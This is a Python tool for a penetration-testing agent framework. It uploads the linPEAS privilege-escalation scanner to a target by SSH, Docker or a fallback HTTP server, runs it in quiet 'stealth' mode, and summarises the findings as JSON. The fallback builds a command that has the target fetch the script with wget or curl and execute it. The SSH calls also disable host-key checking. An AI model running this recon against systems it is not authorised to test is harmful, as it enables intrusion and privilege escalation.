"""
linPEAS delivery, execution and distillation tool.

This tool attempts to deliver `linpeas.sh` to the target (local / SSH /
container), execute it in quiet/stealth mode, save the full raw output to
logs/recon/ and return a compact JSON summary suitable for agents.

If the local copy `src/cai/resources/linpeas.sh` is missing the tool will
download it once from the upstream repository and cache it there.

When the distilled summary is still too large the tool will try a best-effort
embedding of the full report into a temporary ChromaDB collection so agents
can query it later without bloating the chat history.
"""

from __future__ import annotations

import json
import os
import re
import socket
import threading
import subprocess
import time
from datetime import datetime
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Optional
import functools

from cai.sdk.agents import function_tool
from cai.util import notify_tool_loading, write_progress


def _clean_ansi(line: str) -> str:
    """Remove common ANSI escape sequences and trim whitespace."""
    return re.sub(r"\x1b\[[0-9;]*m", "", line).strip()


@function_tool
def execute_linpeas(target: str = "", timeout: int = 1200) -> str:
    """Run linPEAS on the active target and return a compact JSON summary.

    Args:
        target: Optional override of the SSH target in the form `user@host`.
                When empty the tool will use the runtime environment (SSH
                via `SSH_USER`/`SSH_HOST`, container via `CAI_ACTIVE_CONTAINER`,
                or local execution as a fallback).
        timeout: Maximum seconds to wait for linPEAS to complete.

    Returns:
        A JSON string with keys: `vulnerabilities`, `suid_bins`,
        `writable_files`, and `log_file`. Best-effort embedding info may be
        included under `chroma_collection` if available.
    """

    notify_tool_loading(True)
    write_progress("Scanning for PrivEsc...", "cyan")

    # Resolve local cached linpeas path: src/cai/resources/linpeas.sh
    resource_dir = Path(__file__).resolve().parents[2] / "resources"
    resource_dir.mkdir(parents=True, exist_ok=True)
    local_linpeas = resource_dir / "linpeas.sh"

    # Download linpeas if missing (best-effort)
    if not local_linpeas.exists():
        try:
            import urllib.request

            url = (
                "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh"
            )
            with urllib.request.urlopen(url, timeout=30) as resp:
                data = resp.read()
            local_linpeas.write_bytes(data)
            try:
                local_linpeas.chmod(0o755)
            except Exception:
                pass
        except Exception as exc:  # pragma: no cover - network fallback
            notify_tool_loading(False)
            write_progress("linPEAS download failed", "red")
            return json.dumps({"error": f"Failed to download linpeas.sh: {exc}"})

    # Read the script content (text) for upload via stdin when needed
    try:
        script_text = local_linpeas.read_text(errors="replace")
    except Exception as exc:
        notify_tool_loading(False)
        write_progress("linPEAS read failed", "red")
        return json.dumps({"error": f"Failed to read cached linpeas.sh: {exc}"})

    # Determine execution/upload strategy
    ssh_user = os.getenv("SSH_USER", "")
    ssh_host = os.getenv("SSH_HOST", "")
    active_container = os.getenv("CAI_ACTIVE_CONTAINER", "")

    # If caller passed target as user@host prefer that
    if target and "@" in target:
        ssh_user, ssh_host = target.split("@", 1)

    # Upload helper returns a tuple (ok: bool, error_message: Optional[str])
    def _upload_via_ssh(u: str, h: str) -> tuple[bool, Optional[str]]:
        ssh_pass = os.getenv("SSH_PASS", "")
        remote_cmd = "cat > /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
        if ssh_pass:
            cmd = ["sshpass", "-p", ssh_pass, "ssh", "-o", "StrictHostKeyChecking=no", f"{u}@{h}", remote_cmd]
        else:
            cmd = ["ssh", "-o", "StrictHostKeyChecking=no", f"{u}@{h}", remote_cmd]
        try:
            proc = subprocess.run(cmd, input=script_text, text=True, capture_output=True, timeout=60)
            if proc.returncode != 0:
                return False, (proc.stderr or proc.stdout or f"exit {proc.returncode}")
            return True, None
        except Exception as exc:
            return False, str(exc)

    def _exec_ssh(u: str, h: str) -> tuple[bool, str]:
        ssh_pass = os.getenv("SSH_PASS", "")
        run_cmd = "sh /tmp/linpeas.sh -q -s"
        if ssh_pass:
            cmd = ["sshpass", "-p", ssh_pass, "ssh", "-o", "StrictHostKeyChecking=no", f"{u}@{h}", run_cmd]
        else:
            cmd = ["ssh", "-o", "StrictHostKeyChecking=no", f"{u}@{h}", run_cmd]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            out = proc.stdout if proc.stdout else proc.stderr
            return True, out
        except subprocess.TimeoutExpired as exc:
            return False, f"Timeout: {exc}"
        except Exception as exc:
            return False, str(exc)

    def _exec_local() -> tuple[bool, str]:
        try:
            proc = subprocess.run(["sh", "/tmp/linpeas.sh", "-q", "-s"], capture_output=True, text=True, timeout=timeout)
            out = proc.stdout if proc.stdout else proc.stderr
            return True, out
        except subprocess.TimeoutExpired as exc:
            return False, f"Timeout: {exc}"
        except Exception as exc:
            return False, str(exc)

    def _exec_container(container_id: str) -> tuple[bool, str]:
        # Try docker cp then docker exec for simplicity
        try:
            cp_cmd = ["docker", "cp", str(local_linpeas), f"{container_id}:/tmp/linpeas.sh"]
            cp = subprocess.run(cp_cmd, capture_output=True, text=True, timeout=60)
            if cp.returncode != 0:
                return False, cp.stderr or cp.stdout or f"docker cp exit {cp.returncode}"
            exec_cmd = ["docker", "exec", container_id, "sh", "-c", "sh /tmp/linpeas.sh -q -s"]
            proc = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=timeout)
            out = proc.stdout if proc.stdout else proc.stderr
            return True, out
        except subprocess.TimeoutExpired as exc:
            return False, f"Timeout: {exc}"
        except Exception as exc:
            return False, str(exc)

    # HTTP server fallback helpers
    def _get_host_ip() -> Optional[str]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return None

    def _start_http_server(directory: Path):
        """Start a simple HTTP server serving `directory`. Returns (server, thread, port)."""
        handler = functools.partial(SimpleHTTPRequestHandler, directory=str(directory))
        # Bind to all interfaces on an ephemeral port
        server = ThreadingHTTPServer(("0.0.0.0", 0), handler)

        def _serve():
            try:
                server.serve_forever()
            except Exception:
                pass

        thread = threading.Thread(target=_serve, daemon=True)
        thread.start()
        return server, thread, server.server_address[1]

    def _stop_http_server(server, thread):
        try:
            server.shutdown()
        except Exception:
            pass
        try:
            thread.join(timeout=1.0)
        except Exception:
            pass

    def _http_transfer_and_exec(u: str, h: str) -> tuple[bool, str, str]:
        """Start HTTP server and instruct remote to wget/curl and execute. Returns (ok, output, method)."""
        host_ip = _get_host_ip()
        if not host_ip:
            return False, "Could not determine host IP for HTTP transfer", "http-unavailable"

        # Start server
        try:
            server, thread, port = _start_http_server(resource_dir)
        except Exception as exc:
            return False, f"Failed to start HTTP server: {exc}", "http-failed"

        url = f"http://{host_ip}:{port}/linpeas.sh"

        # Build remote fetch+exec command: try wget then curl
        remote_cmd = (
            f"(wget -q -O /tmp/linpeas.sh {url} || curl -sSf -o /tmp/linpeas.sh {url}) && chmod +x /tmp/linpeas.sh && sh /tmp/linpeas.sh -q -s"
        )

        try:
            ssh_pass = os.getenv("SSH_PASS", "")
            if ssh_pass:
                cmd = ["sshpass", "-p", ssh_pass, "ssh", "-o", "StrictHostKeyChecking=no", f"{u}@{h}", remote_cmd]
            else:
                cmd = ["ssh", "-o", "StrictHostKeyChecking=no", f"{u}@{h}", remote_cmd]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 30)
            out = proc.stdout if proc.stdout else proc.stderr
            return (proc.returncode == 0), out, "http-wget"
        except subprocess.TimeoutExpired as exc:
            return False, f"Timeout: {exc}", "http-timeout"
        except Exception as exc:
            return False, str(exc), "http-error"
        finally:
            try:
                _stop_http_server(server, thread)
            except Exception:
                pass

    uploaded = False
    raw_output = ""
    errors: list[str] = []
    transfer_method: Optional[str] = None

    # Prefer SSH if configured
    if ssh_user and ssh_host:
        ok, err = _upload_via_ssh(ssh_user, ssh_host)
        if not ok:
            errors.append(f"upload failed: {err}")
            # We will attempt an HTTP fetch fallback below
        else:
            uploaded = True
            transfer_method = "ssh-upload"

        ok, out = _exec_ssh(ssh_user, ssh_host)
        if ok:
            raw_output = out
        else:
            # Execution failed; attempt HTTP fallback if upload didn't work
            errors.append(out)
            if not uploaded:
                try:
                    ok2, out2, method = _http_transfer_and_exec(ssh_user, ssh_host)
                    transfer_method = transfer_method or method
                    if ok2:
                        raw_output = out2
                    else:
                        errors.append(out2)
                        raw_output = out2
                except Exception as exc:
                    errors.append(str(exc))
                    raw_output = out
            else:
                raw_output = out

    elif active_container:
        ok, out = _exec_container(active_container)
        if ok:
            raw_output = out
            transfer_method = "docker-cp"
        else:
            errors.append(out)
            # Try HTTP fetch into container (best-effort)
            host_ip = _get_host_ip()
            if host_ip:
                try:
                    server = None
                    thread = None
                    try:
                        server, thread, port = _start_http_server(resource_dir)
                        url = f"http://{host_ip}:{port}/linpeas.sh"
                        exec_cmd = (
                            f"/bin/sh -c '(wget -q -O /tmp/linpeas.sh {url} || curl -sSf -o /tmp/linpeas.sh {url}) && chmod +x /tmp/linpeas.sh && sh /tmp/linpeas.sh -q -s'"
                        )
                        docker_cmd = ["docker", "exec", active_container, "sh", "-c", exec_cmd]
                        proc = subprocess.run(docker_cmd, capture_output=True, text=True, timeout=timeout + 30)
                        out2 = proc.stdout if proc.stdout else proc.stderr
                        if proc.returncode == 0:
                            raw_output = out2
                            transfer_method = "http-wget"
                        else:
                            errors.append(out2)
                            raw_output = out2
                    finally:
                        if server is not None:
                            _stop_http_server(server, thread)
                except Exception as exc:
                    errors.append(str(exc))
                    raw_output = out
            else:
                raw_output = out

    else:
        # Local fallback: copy script to /tmp and execute
        try:
            tgt = Path("/tmp/linpeas.sh")
            tgt.write_text(script_text)
            try:
                tgt.chmod(0o755)
            except Exception:
                pass
            uploaded = True
        except Exception as exc:
            errors.append(str(exc))

        ok, out = _exec_local()
        if not ok:
            errors.append(out)
            raw_output = out
        else:
            raw_output = out

    # Save raw output to logs/recon/linpeas_{target}_{timestamp}.log
    logs_dir = Path.cwd() / "logs" / "recon"
    try:
        logs_dir.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass

    safe_target = (target or f"{ssh_user}@{ssh_host}" if ssh_user and ssh_host else "local").replace("/", "_").replace(":", "_").replace("@", "_")
    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    log_path = logs_dir / f"linpeas_{safe_target}_{timestamp}.log"
    try:
        log_path.write_text(raw_output or "", encoding="utf-8", errors="replace")
    except Exception:
        pass

    # Distill the output: focus on [!] and [+] markers and red/yellow ANSI highlights
    vulnerabilities: list[str] = []
    interesting: list[str] = []
    suid_bins: list[str] = []
    writable_files: list[str] = []

    ansi_red = re.compile(r"\x1b\[[0-9;]*31m")
    ansi_yellow = re.compile(r"\x1b\[[0-9;]*33m")

    if raw_output:
        for ln in raw_output.splitlines():
            if "[!]" in ln:
                vulnerabilities.append(_clean_ansi(ln))
                continue
            if "[+]" in ln:
                interesting.append(_clean_ansi(ln))
                continue
            if ansi_red.search(ln) or ansi_yellow.search(ln):
                vulnerabilities.append(_clean_ansi(ln))
            lw = ln.lower()
            if "suid" in lw and "/" in ln:
                suid_bins.append(_clean_ansi(ln))
            if "writable" in lw or "writeable" in lw:
                writable_files.append(_clean_ansi(ln))

    # Deduplicate and cap lists to reasonable sizes
    def _uniq_cap(items: list[str], cap: int = 200) -> list[str]:
        seen = set()
        out = []
        for x in items:
            if x in seen:
                continue
            seen.add(x)
            out.append(x)
            if len(out) >= cap:
                break
        return out

    summary = {
        "vulnerabilities": _uniq_cap(vulnerabilities)[:100],
        "interesting": _uniq_cap(interesting)[:100],
        "suid_bins": _uniq_cap(suid_bins)[:100],
        "writable_files": _uniq_cap(writable_files)[:100],
        "log_file": str(log_path),
        "transfer_method": transfer_method or "unknown",
    }

    # If the distilled summary is still large, attempt a best-effort ChromaDB
    # embedding so agents can query the full report later without bloating chat.
    try:
        if len(json.dumps(summary)) > 2000 and raw_output and len(raw_output) > 4000:
            try:
                import chromadb  # type: ignore
                from sentence_transformers import SentenceTransformer  # type: ignore

                client = chromadb.Client()
                collection_name = f"linpeas_{safe_target}_{timestamp}"
                try:
                    collection = client.create_collection(name=collection_name)
                except Exception:
                    collection = client.get_collection(collection_name)

                # Chunk the raw output into manageable pieces
                max_chunk = 1000
                chunks = [raw_output[i : i + max_chunk] for i in range(0, len(raw_output), max_chunk)]
                ids = [f"{collection_name}_{i}" for i in range(len(chunks))]
                collection.add(ids=ids, documents=chunks)
                summary["chroma_collection"] = collection_name
            except ModuleNotFoundError:
                summary["chroma_message"] = "chromadb or sentence-transformers not installed; embedding skipped"
            except Exception as exc:  # pragma: no cover - optional feature
                summary["chroma_error"] = str(exc)
    except Exception:
        # Never fail the tool because embedding failed
        pass

    # Add upload/execution metadata when there were notable errors
    if errors:
        summary["errors"] = errors[:10]

    notify_tool_loading(False)
    write_progress("PrivEsc scan complete", "green")

    return json.dumps(summary, ensure_ascii=False)
